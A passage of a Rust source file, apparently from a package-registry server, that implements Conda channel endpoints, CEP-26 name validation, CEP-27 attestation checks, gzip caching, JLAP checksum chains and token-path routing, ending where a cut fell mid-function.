//! Conda Channel API handlers.
//!
//! Implements the endpoints required for `conda install` from a private channel.
//!
//! Routes are mounted at `/conda/{repo_key}/...`:
//!   GET  /conda/{repo_key}/channeldata.json                  - Channel metadata
//!   GET  /conda/{repo_key}/notices.json                      - Channel notices (CEP-6)
//!   GET  /conda/{repo_key}/keys/repo.pub                     - Repository public key (PEM)
//!   GET  /conda/{repo_key}/{subdir}/repodata.json            - Repository data for subdir
//!   GET  /conda/{repo_key}/{subdir}/repodata.json.bz2        - Compressed repodata
//!   GET  /conda/{repo_key}/{subdir}/repodata.json.sig        - Repodata signature (raw bytes)
//!   GET  /conda/{repo_key}/{subdir}/repodata.json.zst        - Compressed repodata (zstd)
//!   GET  /conda/{repo_key}/{subdir}/repodata.json.jlap       - JLAP incremental updates
//!   GET  /conda/{repo_key}/{subdir}/current_repodata.json    - Current (latest) repodata
//!   GET  /conda/{repo_key}/{subdir}/run_exports.json         - Run exports metadata (CEP-12)
//!   GET  /conda/{repo_key}/{subdir}/patch_instructions.json  - Repodata patch instructions
//!   GET  /conda/{repo_key}/{subdir}/repodata_shards.msgpack.zst - CEP-16 shard index
//!   GET  /conda/{repo_key}/{subdir}/shards/{hash}.msgpack.zst   - CEP-16 individual shard
//!   GET  /conda/{repo_key}/{subdir}/{filename}               - Download package
//!   PUT  /conda/{repo_key}/{subdir}/{filename}               - Upload package
//!   DELETE /conda/{repo_key}/{subdir}/{filename}             - Withdraw package (#4059)
//!   POST /conda/{repo_key}/upload                            - Upload package (alternative)
//!
//! All read routes are also available with URL path token authentication:
//!   GET  /conda/t/{token}/{repo_key}/...                     - Token-authenticated access

use std::collections::{BTreeMap, BTreeSet};
use std::io::Write;
use std::sync::Arc;

use axum::body::Body;
use axum::extract::{Path, State};
use axum::http::header::{
    ACCEPT_ENCODING, CACHE_CONTROL, CONTENT_ENCODING, CONTENT_LENGTH, CONTENT_TYPE, ETAG,
};
use axum::http::{HeaderMap, StatusCode};
use axum::response::{IntoResponse, Response};
use axum::routing::{get, post};
use axum::Extension;
use axum::Router;
use bytes::Bytes;
use sha2::{Digest, Sha256};
use tracing::info;

use crate::api::handlers::cache_headers::{check_conditional_request, compute_etag};
use crate::api::handlers::proxy_helpers::{self, RepoInfo};
use crate::api::middleware::auth::{require_auth_basic, require_auth_basic_scope, AuthExtension};
use crate::api::SharedState;
use crate::formats::conda_native::CondaNativeHandler;
use crate::models::repository::RepositoryType;
use crate::services::auth_service::AuthService;
use crate::services::conda_identity::{
    self, CondaArchiveType, CondaIdentity, CondaIdentityInput, NoarchKind,
};
use crate::services::signing_service::SigningService;

// ---------------------------------------------------------------------------
// CEP-26: Conda naming constraints
// ---------------------------------------------------------------------------
//
// Package names, version strings, build strings, and filenames must conform
// to strict regex patterns and length limits defined in CEP-26.

/// Maximum length for a conda package name (CEP-26).
const CEP26_MAX_NAME_LEN: usize = 64;
/// Maximum length for a conda version string (CEP-26).
const CEP26_MAX_VERSION_LEN: usize = 64;
/// Maximum length for a conda build string (CEP-26).
const CEP26_MAX_BUILD_LEN: usize = 64;
/// Maximum length for a conda package filename (CEP-26).
const CEP26_MAX_FILENAME_LEN: usize = 211;

/// Validate a conda package name per CEP-26.
///
/// Pattern: lowercase alphanumeric, may contain `.`, `-`, `_` as separators
/// but no consecutive underscores. Must start with a letter or digit.
fn validate_cep26_name(name: &str) -> Result<(), String> {
    if name.is_empty() {
        return Err("package name must not be empty".to_string());
    }
    if name.len() > CEP26_MAX_NAME_LEN {
        return Err(format!(
            "package name '{}' exceeds max length of {} characters (got {})",
            name,
            CEP26_MAX_NAME_LEN,
            name.len()
        ));
    }
    // Must be lowercase
    if name != name.to_lowercase() {
        return Err(format!("package name '{}' must be lowercase", name));
    }
    // Must start with alphanumeric
    if !name.starts_with(|c: char| c.is_ascii_lowercase() || c.is_ascii_digit()) {
        return Err(format!(
            "package name '{}' must start with a lowercase letter or digit",
            name
        ));
    }
    // Only allowed characters: lowercase alphanumeric, `.`, `-`, `_`
    for ch in name.chars() {
        if !ch.is_ascii_lowercase() && !ch.is_ascii_digit() && ch != '.' && ch != '-' && ch != '_' {
            return Err(format!(
                "package name '{}' contains invalid character '{}'",
                name, ch
            ));
        }
    }
    // No consecutive underscores
    if name.contains("__") {
        return Err(format!(
            "package name '{}' must not contain consecutive underscores",
            name
        ));
    }
    Ok(())
}

/// Validate a conda version string per CEP-26.
///
/// Allowed characters: digits, periods, lowercase letters, `_`, `+`, `!`
fn validate_cep26_version(version: &str) -> Result<(), String> {
    if version.is_empty() {
        return Err("version must not be empty".to_string());
    }
    if version.len() > CEP26_MAX_VERSION_LEN {
        return Err(format!(
            "version '{}' exceeds max length of {} characters (got {})",
            version,
            CEP26_MAX_VERSION_LEN,
            version.len()
        ));
    }
    for ch in version.chars() {
        if !ch.is_ascii_digit()
            && !ch.is_ascii_lowercase()
            && ch != '.'
            && ch != '_'
            && ch != '+'
            && ch != '!'
        {
            return Err(format!(
                "version '{}' contains invalid character '{}'",
                version, ch
            ));
        }
    }
    Ok(())
}

/// Validate a conda build string per CEP-26.
///
/// Pattern: `^[a-zA-Z0-9_.+]+$`
fn validate_cep26_build(build: &str) -> Result<(), String> {
    if build.is_empty() {
        return Err("build string must not be empty".to_string());
    }
    if build.len() > CEP26_MAX_BUILD_LEN {
        return Err(format!(
            "build string '{}' exceeds max length of {} characters (got {})",
            build,
            CEP26_MAX_BUILD_LEN,
            build.len()
        ));
    }
    for ch in build.chars() {
        if !ch.is_ascii_alphanumeric() && ch != '_' && ch != '.' && ch != '+' {
            return Err(format!(
                "build string '{}' contains invalid character '{}'",
                build, ch
            ));
        }
    }
    Ok(())
}

/// Validate a conda filename per CEP-26.
///
/// Format: `<name>-<version>-<build>.<ext>`, max 211 characters.
/// Also rejects path traversal sequences and directory separators.
fn validate_cep26_filename(filename: &str) -> Result<(), String> {
    if filename.contains("..") || filename.contains('/') || filename.contains('\\') {
        return Err(format!(
            "filename '{}' contains path traversal sequences",
            filename
        ));
    }
    if filename.contains('\0') {
        return Err("filename contains null bytes".to_string());
    }
    if filename.len() > CEP26_MAX_FILENAME_LEN {
        return Err(format!(
            "filename '{}' exceeds max length of {} characters (got {})",
            filename,
            CEP26_MAX_FILENAME_LEN,
            filename.len()
        ));
    }
    Ok(())
}

/// Validate a conda subdir name per CEP-26.
///
/// Must be `noarch` or match `^[a-z0-9]+-[a-z0-9]+$`, max 32 characters.
fn validate_cep26_subdir(subdir: &str) -> Result<(), String> {
    if subdir.len() > 32 {
        return Err(format!(
            "subdir '{}' exceeds max length of 32 characters (got {})",
            subdir,
            subdir.len()
        ));
    }
    if subdir == "noarch" {
        return Ok(());
    }
    // Must match <platform>-<arch> pattern
    let parts: Vec<&str> = subdir.splitn(2, '-').collect();
    if parts.len() != 2 {
        return Err(format!(
            "subdir '{}' must be 'noarch' or '<platform>-<arch>'",
            subdir
        ));
    }
    for part in &parts {
        for ch in part.chars() {
            if !ch.is_ascii_lowercase() && !ch.is_ascii_digit() {
                return Err(format!(
                    "subdir '{}' contains invalid character '{}'",
                    subdir, ch
                ));
            }
        }
    }
    Ok(())
}

/// Perform full CEP-26 naming validation on a conda package upload.
fn validate_cep26_naming(
    name: &str,
    version: &str,
    build: &str,
    filename: &str,
    subdir: &str,
) -> Result<(), String> {
    validate_cep26_name(name)?;
    validate_cep26_version(version)?;
    validate_cep26_build(build)?;
    validate_cep26_filename(filename)?;
    validate_cep26_subdir(subdir)?;
    Ok(())
}

// ---------------------------------------------------------------------------
// CEP-27: Publish attestation validation
// ---------------------------------------------------------------------------
//
// CEP-27 defines an in-toto Statement v1 attestation format for conda
// package provenance. Attestations are signed with Sigstore and bind a
// package filename + SHA256 to a publishing identity.

/// The in-toto Statement v1 type URI.
const INTOTO_STATEMENT_V1: &str = "https://in-toto.io/Statement/v1";

/// The CEP-27 predicate type for conda publish attestations.
const CEP27_PREDICATE_TYPE: &str = "https://schemas.conda.org/attestations-publish-1.schema.json";

/// Validate a CEP-27 publish attestation structure.
///
/// Checks that the attestation conforms to the in-toto Statement v1 schema
/// with the conda publish predicate type. Does NOT verify cryptographic
/// signatures (that requires Sigstore infrastructure).
fn validate_cep27_attestation(
    attestation: &serde_json::Value,
    expected_filename: &str,
    expected_sha256: &str,
) -> Result<(), String> {
    // Validate _type field
    let stmt_type = attestation
        .get("_type")
        .and_then(|v| v.as_str())
        .ok_or("attestation missing '_type' field")?;
    if stmt_type != INTOTO_STATEMENT_V1 {
        return Err(format!(
            "attestation _type must be '{}', got '{}'",
            INTOTO_STATEMENT_V1, stmt_type
        ));
    }

    // Validate predicateType
    let predicate_type = attestation
        .get("predicateType")
        .and_then(|v| v.as_str())
        .ok_or("attestation missing 'predicateType' field")?;
    if predicate_type != CEP27_PREDICATE_TYPE {
        return Err(format!(
            "attestation predicateType must be '{}', got '{}'",
            CEP27_PREDICATE_TYPE, predicate_type
        ));
    }

    // Validate subject array (exactly one entry)
    let subjects = attestation
        .get("subject")
        .and_then(|v| v.as_array())
        .ok_or("attestation missing 'subject' array")?;
    if subjects.len() != 1 {
        return Err(format!(
            "attestation subject must have exactly 1 entry, got {}",
            subjects.len()
        ));
    }

    let subject = &subjects[0];

    // Validate subject name matches expected filename
    let name = subject
        .get("name")
        .and_then(|v| v.as_str())
        .ok_or("attestation subject missing 'name' field")?;
    if name != expected_filename {
        return Err(format!(
            "attestation subject name '{}' does not match package filename '{}'",
            name, expected_filename
        ));
    }

    // Validate subject digest
    let digest = subject
        .get("digest")
        .and_then(|v| v.as_object())
        .ok_or("attestation subject missing 'digest' object")?;
    let sha256 = digest
        .get("sha256")
        .and_then(|v| v.as_str())
        .ok_or("attestation subject digest missing 'sha256' field")?;
    if sha256.len() != 64 || !sha256.chars().all(|c| c.is_ascii_hexdigit()) {
        return Err(format!(
            "attestation sha256 must be a 64-character hex string, got '{}'",
            sha256
        ));
    }
    if sha256 != expected_sha256 {
        return Err(format!(
            "attestation sha256 '{}' does not match package sha256 '{}'",
            sha256, expected_sha256
        ));
    }

    // Validate predicate (optional, but if present must have targetChannel)
    if let Some(predicate) = attestation.get("predicate") {
        if !predicate.is_null() {
            let pred_obj = predicate
                .as_object()
                .ok_or("attestation predicate must be an object or null")?;
            if let Some(target) = pred_obj.get("targetChannel") {
                let url = target.as_str().ok_or("targetChannel must be a string")?;
                if url.is_empty() || url.len() > 2083 {
                    return Err(format!(
                        "targetChannel must be 1-2083 characters, got {}",
                        url.len()
                    ));
                }
                if url.ends_with('/') {
                    return Err("targetChannel must not end with a trailing slash".to_string());
                }
            }
        }
    }

    Ok(())
}

/// Common Conda subdirectories.
const KNOWN_SUBDIRS: &[&str] = &[
    "noarch",
    "linux-32",
    "linux-64",
    "linux-aarch64",
    "linux-armv6l",
    "linux-armv7l",
    "linux-ppc64le",
    "linux-s390x",
    "osx-64",
    "osx-arm64",
    "win-32",
    "win-64",
    "win-arm64",
];

// HTTP caching helpers (compute_etag, check_conditional_request, etc.) now
// live in `crate::api::handlers::cache_headers` and are shared with the Maven
// handler (#2079). This file keeps Conda's gzip-aware wrapper.

/// Check if the client accepts gzip encoding.
fn accepts_gzip(headers: &HeaderMap) -> bool {
    headers
        .get(ACCEPT_ENCODING)
        .and_then(|v| v.to_str().ok())
        .map(|v| v.split(',').any(|e| e.trim().starts_with("gzip")))
        .unwrap_or(false)
}

/// Gzip-compress data using flate2.
fn gzip_compress(data: &[u8]) -> Vec<u8> {
    use flate2::write::GzEncoder;
    use flate2::Compression;
    let mut encoder = GzEncoder::new(Vec::new(), Compression::fast());
    encoder.write_all(data).unwrap();
    encoder.finish().unwrap()
}

/// Build a cacheable response with ETag and Cache-Control headers.
///
/// Takes `impl Into<Bytes>` so a proxied upstream body (already a [`Bytes`])
/// rides into the response without the extra whole-body `to_vec()` copy the
/// remote branches used to make, while locally generated `Vec<u8>` documents
/// convert for free (#2915).
async fn cacheable_response(
    body: impl Into<Bytes>,
    content_type: &str,
    headers: &HeaderMap,
) -> Response {
    cacheable_response_coded(body, content_type, None, headers).await
}

/// [`cacheable_response`] for a body that may ALREADY carry a content coding.
///
/// `upstream_content_encoding` is the `Content-Encoding` the body arrived with
/// (proxied Remote metadata). Two things follow from it (#2915):
///
///  1. It must be forwarded verbatim. The proxy's HTTP client no longer lets
///     reqwest decode upstream bodies (see `http_client::base_client_builder`),
///     so an undeclared coded body would have the client write compressed bytes
///     to disk as if they were JSON.
///  2. Our own gzip pass below MUST be skipped. Re-gzipping a body that is
///     already `Content-Encoding: gzip` (as some channel mirrors serve
///     `repodata.json`) produces doubly-gzipped bytes declared as singly
///     gzipped — a body no client can read.
///
/// `None` means "identity body, compress at will" and is what every locally
/// generated document passes.
async fn cacheable_response_coded(
    body: impl Into<Bytes>,
    content_type: &str,
    upstream_content_encoding: Option<&str>,
    headers: &HeaderMap,
) -> Response {
    use crate::api::handlers::cache_headers;

    let body: Bytes = body.into();
    let etag = compute_etag(&body);

    if let Some(not_modified) = check_conditional_request(headers, &etag) {
        return not_modified;
    }

    // Conda-specific: serve gzip-compressed JSON responses when the client
    // advertises gzip (Conda clients commonly don't support zstd/bz2 for
    // repodata, so gzip is a useful middle ground). Never for an
    // already-content-coded body — see the doc comment above.
    if content_type == "application/json"
        && upstream_content_encoding.is_none()
        && accepts_gzip(headers)
    {
        // #2915: repodata documents reach tens of MiB (conda-forge's
        // linux-64/noarch channels), and gzipping one is a CPU-bound
        // multi-hundred-millisecond stall. Run it on the blocking pool so it
        // cannot block the tokio worker (and with it every other request that
        // worker is driving). `Bytes` clones are refcount bumps, so handing the
        // body to the blocking task costs nothing.
        let to_compress = body.clone();
        match tokio::task::spawn_blocking(move || gzip_compress(&to_compress)).await {
            Ok(compressed) => {
                return Response::builder()
                    .status(StatusCode::OK)
                    .header(CONTENT_TYPE, content_type)
                    .header(CONTENT_ENCODING, "gzip")
                    .header(CONTENT_LENGTH, compressed.len().to_string())
                    .header(ETAG, &etag)
                    .header(CACHE_CONTROL, cache_headers::DEFAULT_CACHE_CONTROL)
                    .header("Vary", "Accept-Encoding")
                    .body(Body::from(compressed))
                    .unwrap();
            }
            // A join error means the blocking task panicked or the runtime is
            // shutting down. Compression is an optimization, not a correctness
            // requirement: fall through and serve the identity body rather than
            // failing a request that has all its bytes in hand.
            Err(e) => {
                tracing::warn!(
                    error = %e,
                    "conda gzip offload failed; serving uncompressed body"
                );
            }
        }
    }

    let mut builder = Response::builder()
        .status(StatusCode::OK)
        .header(CONTENT_TYPE, content_type)
        .header(CONTENT_LENGTH, body.len().to_string())
        .header(ETAG, &etag)
        .header(CACHE_CONTROL, cache_headers::DEFAULT_CACHE_CONTROL);
    if let Some(encoding) = upstream_content_encoding {
        builder = builder.header(CONTENT_ENCODING, encoding);
    }
    builder.body(Body::from(body)).unwrap()
}

// ---------------------------------------------------------------------------
// JLAP (JSON Lines And Patches) - incremental repodata updates
// ---------------------------------------------------------------------------
//
// JLAP is a conda protocol for incremental repodata updates. Instead of
// downloading the full repodata.json on every solve, clients fetch
// repodata.json.jlap which contains a series of JSON patches.
//
// File format:
//   Line 0:     IV (64 hex chars, initialization vector for checksum chain)
//   Lines 1..N: Patch lines (compact JSON: {from, patch, to})
//   Line N+1:   Metadata line (compact JSON: {latest, url})
//   Line N+2:   Trailing checksum (64 hex chars)
//
// The checksum chain uses BLAKE2b-256 in keyed mode where each line's
// checksum depends on the previous line's checksum.

/// JLAP patch step limit. If a diff produces more operations than this,
/// skip the patch (clients will fall back to full download).
#[allow(dead_code)]
const JLAP_PATCH_STEPS_LIMIT: usize = 8192;

/// Compute BLAKE2b-256 keyed hash (32-byte digest).
///
/// Uses BLAKE2b in MAC mode with a 32-byte key as specified by the JLAP
/// checksum chain protocol.
fn blake2_256_keyed(data: &[u8], key: &[u8; 32]) -> [u8; 32] {
    use blake2::digest::consts::U32;
    use blake2::digest::{FixedOutput, KeyInit};
    use blake2::Blake2bMac;

    let mut hasher = <Blake2bMac<U32>>::new_from_slice(key)
        .expect("BLAKE2b-256 keyed hash creation should not fail");
    blake2::digest::Update::update(&mut hasher, data);
    let result = hasher.finalize_fixed();
    let mut out = [0u8; 32];
    out.copy_from_slice(&result);
    out
}

/// Compute BLAKE2b-256 unkeyed hash of data (for hashing repodata.json content).
fn blake2_256(data: &[u8]) -> [u8; 32] {
    use blake2::digest::consts::U32;
    use blake2::digest::FixedOutput;
    use blake2::Blake2b;

    type Blake2b256 = Blake2b<U32>;
    let mut hasher = Blake2b256::default();
    blake2::digest::Update::update(&mut hasher, data);
    let result = hasher.finalize_fixed();
    let mut out = [0u8; 32];
    out.copy_from_slice(&result);
    out
}

/// Generate RFC 6902 JSON Patch operations to transform `old` repodata into `new`.
///
/// Only diffs the `packages` and `packages.conda` maps (the volatile parts).
/// Returns the operations as a JSON array, or None if there are no changes.
#[allow(dead_code)]
fn generate_repodata_patch(
    old: &serde_json::Value,
    new: &serde_json::Value,
) -> Option<Vec<serde_json::Value>> {
    let mut ops = Vec::new();

    for section in &["packages", "packages.conda"] {
        let old_map = old.get(section).and_then(|v| v.as_object());
        let new_map = new.get(section).and_then(|v| v.as_object());

        let old_map = old_map.cloned().unwrap_or_default();
        let new_map = new_map.cloned().unwrap_or_default();

        // Removed packages
        for key in old_map.keys() {
            if !new_map.contains_key(key) {
                ops.push(serde_json::json!({
                    "op": "remove",
                    "path": format!("/{}/{}", section, escape_json_pointer(key)),
                }));
            }
        }

        // Added packages
        for (key, value) in &new_map {
            if !old_map.contains_key(key) {
                ops.push(serde_json::json!({
                    "op": "add",
                    "path": format!("/{}/{}", section, escape_json_pointer(key)),
                    "value": value,
                }));
            }
        }

        // Changed packages
        for (key, new_value) in &new_map {
            if let Some(old_value) = old_map.get(key) {
                if old_value != new_value {
                    ops.push(serde_json::json!({
                        "op": "replace",
                        "path": format!("/{}/{}", section, escape_json_pointer(key)),
                        "value": new_value,
                    }));
                }
            }
        }
    }

    // Also diff the "removed" array
    let old_removed = old.get("removed");
    let new_removed = new.get("removed");
    if old_removed != new_removed {
        if let Some(nr) = new_removed {
            ops.push(serde_json::json!({
                "op": "replace",
                "path": "/removed",
                "value": nr,
            }));
        }
    }

    if ops.is_empty() {
        None
    } else if ops.len() > JLAP_PATCH_STEPS_LIMIT {
        tracing::debug!(
            ops = ops.len(),
            limit = JLAP_PATCH_STEPS_LIMIT,
            "JLAP patch too large, skipping"
        );
        None
    } else {
        Some(ops)
    }
}

/// Escape a JSON Pointer token per RFC 6901 (~ -> ~0, / -> ~1).
#[allow(dead_code)]
fn escape_json_pointer(token: &str) -> String {
    token.replace('~', "~0").replace('/', "~1")
}

/// Build a complete JLAP file from a series of patch entries.
///
/// Each entry is (from_hash, patch_ops, to_hash). The function constructs
/// the IV line, patch lines, metadata line, and trailing checksum.
fn build_jlap_file(
    patches: &[([u8; 32], Vec<serde_json::Value>, [u8; 32])],
    latest_hash: &[u8; 32],
) -> Vec<u8> {
    let mut lines: Vec<String> = Vec::new();
    let iv = [0u8; 32];

    // Line 0: IV (all zeros for a fresh JLAP file)
    lines.push(hex::encode(iv));

    // Patch lines
    for (from_hash, ops, to_hash) in patches {
        let patch_line = serde_json::json!({
            "from": hex::encode(from_hash),
            "patch": ops,
            "to": hex::encode(to_hash),
        });
        // Compact JSON, sorted keys
        lines.push(sorted_compact_json(&patch_line));
    }

    // Metadata line
    let metadata = serde_json::json!({
        "latest": hex::encode(latest_hash),
        "url": "repodata.json",
    });
    lines.push(sorted_compact_json(&metadata));

    // Compute checksum chain to produce trailing checksum
    let mut checksum = iv;
    for line in &lines[1..] {
        checksum = blake2_256_keyed(line.as_bytes(), &checksum);
    }

    // Trailing checksum line
    lines.push(hex::encode(checksum));

    // Join with newlines, no trailing newline
    lines.join("\n").into_bytes()
}

/// Build a minimal "bootstrap" JLAP file with no patches.
///
/// This tells clients the current repodata hash without providing any
/// incremental patches. Clients will compare their cached hash against
/// `latest` and fall back to a full download if they differ.
fn build_bootstrap_jlap(repodata_bytes: &[u8]) -> Vec<u8> {
    let hash = blake2_256(repodata_bytes);
    build_jlap_file(&[], &hash)
}

/// Serialize a JSON value with sorted keys and compact separators.
///
/// This matches Python's `json.dumps(obj, sort_keys=True, separators=(",", ":"))`.
fn sorted_compact_json(value: &serde_json::Value) -> String {
    // serde_json serializes object keys in insertion order.
    // We need sorted keys for JLAP spec compliance.
    fn sort_value(v: &serde_json::Value) -> serde_json::Value {
        match v {
            serde_json::Value::Object(map) => {
                let sorted: serde_json::Map<String, serde_json::Value> = map
                    .iter()
                    .map(|(k, v)| (k.clone(), sort_value(v)))
                    .collect::<Vec<_>>()
                    .into_iter()
                    .collect::<BTreeMap<_, _>>()
                    .into_iter()
                    .collect();
                serde_json::Value::Object(sorted)
            }
            serde_json::Value::Array(arr) => {
                serde_json::Value::Array(arr.iter().map(sort_value).collect())
            }
            other => other.clone(),
        }
    }

    let sorted = sort_value(value);
    serde_json::to_string(&sorted).unwrap()
}

/// Verify a JLAP file's checksum chain integrity.
///
/// Returns Ok(()) if the chain is valid, Err with a description if not.
#[allow(dead_code)]
fn verify_jlap_chain(content: &[u8]) -> Result<(), String> {
    let text = std::str::from_utf8(content).map_err(|e| format!("invalid UTF-8: {}", e))?;
    let lines: Vec<&str> = text.split('\n').collect();

    if lines.len() < 3 {
        return Err(format!(
            "JLAP file too short: {} lines (need >= 3)",
            lines.len()
        ));
    }

    // Line 0 is the IV
    let iv = hex::decode(lines[0]).map_err(|e| format!("invalid IV hex: {}", e))?;
    if iv.len() != 32 {
        return Err(format!("IV must be 32 bytes, got {}", iv.len()));
    }
    let mut checksum: [u8; 32] = iv.try_into().unwrap();

    // Compute chain for lines 1..N-1 (all lines except IV and trailing checksum)
    for line in &lines[1..lines.len() - 1] {
        checksum = blake2_256_keyed(line.as_bytes(), &checksum);
    }

    // Verify trailing checksum
    let expected = hex::encode(checksum);
    let actual = lines[lines.len() - 1];
    if expected != actual {
        return Err(format!(
            "checksum mismatch: expected {}, got {}",
            expected, actual
        ));
    }

    Ok(())
}

// ---------------------------------------------------------------------------
// Router
// ---------------------------------------------------------------------------

pub fn router() -> Router<SharedState> {
    Router::new()
        // Channel metadata
        .route("/:repo_key/channeldata.json", get(channeldata_json))
        // Channel notices (CEP-6)
        .route("/:repo_key/notices.json", get(notices_json))
        // Public key endpoint
        .route("/:repo_key/keys/repo.pub", get(repo_public_key))
        // Upload (alternative POST)
        .route("/:repo_key/upload", post(upload_post))
        // Subdir repodata endpoints
        .route("/:repo_key/:subdir/repodata.json", get(repodata_json))
        .route(
            "/:repo_key/:subdir/repodata.json.bz2",
            get(repodata_json_bz2),
        )
        .route(
            "/:repo_key/:subdir/repodata.json.sig",
            get(repodata_json_sig),
        )
        .route(
            "/:repo_key/:subdir/repodata.json.zst",
            get(repodata_json_zst),
        )
        // JLAP incremental repodata updates
        .route(
            "/:repo_key/:subdir/repodata.json.jlap",
            get(repodata_json_jlap),
        )
        .route(
            "/:repo_key/:subdir/current_repodata.json",
            get(current_repodata_json),
        )
        // Run exports (CEP-12)
        .route("/:repo_key/:subdir/run_exports.json", get(run_exports_json))
        // Patch instructions
        .route(
            "/:repo_key/:subdir/patch_instructions.json",
            get(patch_instructions_json),
        )
        // CEP-16 sharded repodata
        .route(
            "/:repo_key/:subdir/repodata_shards.msgpack.zst",
            get(sharded_repodata_index),
        )
        .route(
            "/:repo_key/:subdir/shards/:shard_hash",
            get(sharded_repodata_shard),
        )
        // Package download, upload, and withdrawal
        .route(
            "/:repo_key/:subdir/:filename",
            get(download_package)
                .put(upload_package_put)
                .delete(withdraw_package),
        )
        // CEP-27 attestation endpoints
        .route(
            "/:repo_key/:subdir/:filename/attestation",
            get(get_attestation).put(put_attestation),
        )
}

/// Router for token-authenticated conda endpoints.
///
/// Conda clients can embed authentication tokens in the URL path:
///   /conda/t/<TOKEN>/<repo_key>/<subdir>/repodata.json
///
/// This is configured in `.condarc` as:
///   channels:
///     - https://host/conda/t/<TOKEN>/my-channel
pub fn token_router() -> Router<SharedState> {
    Router::new()
        .route(
            "/:token/:repo_key/channeldata.json",
            get(channeldata_json_with_token),
        )
        .route(
            "/:token/:repo_key/notices.json",
            get(notices_json_with_token),
        )
        .route(
            "/:token/:repo_key/keys/repo.pub",
            get(repo_public_key_with_token),
        )
        .route("/:token/:repo_key/upload", post(upload_post_with_token))
        .route(
            "/:token/:repo_key/:subdir/repodata.json",
            get(repodata_json_with_token),
        )
        .route(
            "/:token/:repo_key/:subdir/repodata.json.bz2",
            get(repodata_json_bz2_with_token),
        )
        .route(
            "/:token/:repo_key/:subdir/repodata.json.sig",
            get(repodata_json_sig_with_token),
        )
        .route(
            "/:token/:repo_key/:subdir/repodata.json.zst",
            get(repodata_json_zst_with_token),
        )
        .route(
            "/:token/:repo_key/:subdir/repodata.json.jlap",
            get(repodata_json_jlap_with_token),
        )
        .route(
            "/:token/:repo_key/:subdir/current_repodata.json",
            get(current_repodata_json_with_token),
        )
        .route(
            "/:token/:repo_key/:subdir/run_exports.json",
            get(run_exports_json_with_token),
        )
        .route(
            "/:token/:repo_key/:subdir/patch_instructions.json",
            get(patch_instructions_json_with_token),
        )
        .route(
            "/:token/:repo_key/:subdir/repodata_shards.msgpack.zst",
            get(sharded_repodata_index_with_token),
        )
        .route(
            "/:token/:repo_key/:subdir/shards/:shard_hash",
            get(sharded_repodata_shard_with_token),
        )
        .route(
            "/:token/:repo_key/:subdir/:filename",
            get(download_package_with_token).put(upload_package_put_with_token),
        )
        .route(
            "/:token/:repo_key/:subdir/:filename/attestation",
            get(get_attestation_with_token).put(put_attestation_with_token),
        )
        // Token URLs embed secrets in the path. Prevent leakage via Referer
        // headers and ensure proxies don't cache token-authenticated responses.
        .layer(axum::middleware::map_response(
            |mut response: Response| async move {
                let headers = response.headers_mut();
                headers.insert("Referrer-Policy", "no-referrer".parse().unwrap());
                headers.insert("Cache-Control", "private, no-store".parse().unwrap());
                response
            },
        ))
}

// ---------------------------------------------------------------------------
// Token-authenticated GET handlers (for /conda/t/<TOKEN>/ URL paths).
//
// The conda token router nests every read route under a leading `/:token`
// segment. These handlers exist solely to bind that extra segment and delegate
// to the shared non-token handler with a correctly-aligned `Path` tuple.
//
// Credential resolution for the URL token happens upstream in
// `repo_visibility_middleware` (`extract_conda_url_token`), which validates the
// token and injects the resulting `Option<AuthExtension>` before these handlers
// run; the token segment itself is discarded here. Without these dedicated
// handlers the non-token handlers bind `Path<(repo_key, subdir, ...)>`
// positionally against the token-prefixed path, so every parameter shifts by
// one (`repo_key` receives the token) and resolution never reaches a valid
// channel -- a valid token-channel read then 401s.
// ---------------------------------------------------------------------------

async fn channeldata_json_with_token(
    state: State<SharedState>,
    auth: Extension<Option<AuthExtension>>,
    headers: HeaderMap,
    Path((_token, repo_key)): Path<(String, String)>,
) -> Result<Response, Response> {
    channeldata_json(state, auth, headers, Path(repo_key)).await
}

async fn notices_json_with_token(
    state: State<SharedState>,
    headers: HeaderMap,
    Path((_token, repo_key)): Path<(String, String)>,
) -> Result<Response, Response> {
    notices_json(state, headers, Path(repo_key)).await
}

async fn repo_public_key_with_token(
    state: State<SharedState>,
    Path((_token, repo_key)): Path<(String, String)>,
) -> Result<Response, Response> {
    repo_public_key(state, Path(repo_key)).await
}

async fn repodata_json_with_token(
    state: State<SharedState>,
    auth: Extension<Option<AuthExtension>>,
    headers: HeaderMap,
    Path((_token, repo_key, subdir)): Path<(String, String, String)>,
) -> Result<Response, Response> {
    repodata_json(state, auth, headers, Path((repo_key, subdir))).await
}

async fn repodata_json_bz2_with_token(
    state: State<SharedState>,
    auth: Extension<Option<AuthExtension>>,
    headers: HeaderMap,
    Path((_token, repo_key, subdir)): Path<(String, String, String)>,
) -> Result<Response, Response> {
    repodata_json_bz2(state, auth, headers, Path((repo_key, subdir))).await
}

async fn repodata_json_sig_with_token(
    state: State<SharedState>,
    Path((_token, repo_key, subdir)): Path<(String, String, String)>,
) -> Result<Response, Response> {
    repodata_json_sig(state, Path((repo_key, subdir))).await
}

async fn repodata_json_zst_with_token(
    state: State<SharedState>,
    auth: Extension<Option<AuthExtension>>,
    headers: HeaderMap,
    Path((_token, repo_key, subdir)): Path<(String, String, String)>,
) -> Result<Response, Response> {
    repodata_json_zst(state, auth, headers, Path((repo_key, subdir))).await
}

async fn repodata_json_jlap_with_token(
    state: State<SharedState>,
    headers: HeaderMap,
    Path((_token, repo_key, subdir)): Path<(String, String, String)>,
) -> Result<Response, Response> {
    repodata_json_jlap(state, headers, Path((repo_key, subdir))).await
}

async fn current_repodata_json_with_token(
    state: State<SharedState>,
    headers: HeaderMap,
    Path((_token, repo_key, subdir)): Path<(String, String, String)>,
) -> Result<Response, Response> {
    current_repodata_json(state, headers, Path((repo_key, subdir))).await
}

async fn run_exports_json_with_token(
    state: State<SharedState>,
    headers: HeaderMap,
    Path((_token, repo_key, subdir)): Path<(String, String, String)>,
) -> Result<Response, Response> {
    run_exports_json(state, headers, Path((repo_key, subdir))).await
}

async fn patch_instructions_json_with_token(
    state: State<SharedState>,
    headers: HeaderMap,
    Path((_token, repo_key, subdir)): Path<(String, String, String)>,
) -> Result<Response, Response> {
    patch_instructions_json(state, headers, Path((repo_key, subdir))).await
}

async fn sharded_repodata_index_with_token(
    state: State<SharedState>,
    Path((_token, repo_key, subdir)): Path<(String, String, String)>,
) -> Result<Response, Response> {
    sharded_repodata_index(state, Path((repo_key, subdir))).await
}

async fn sharded_repodata_shard_with_token(
    state: State<SharedState>,
    Path((_token, repo_key, subdir, shard_hash)): Path<(String, String, String, String)>,
) -> Result<Response, Response> {
    sharded_repodata_shard(state, Path((repo_key, subdir, shard_hash))).await
}

async fn download_package_with_token(
    state: State<SharedState>,
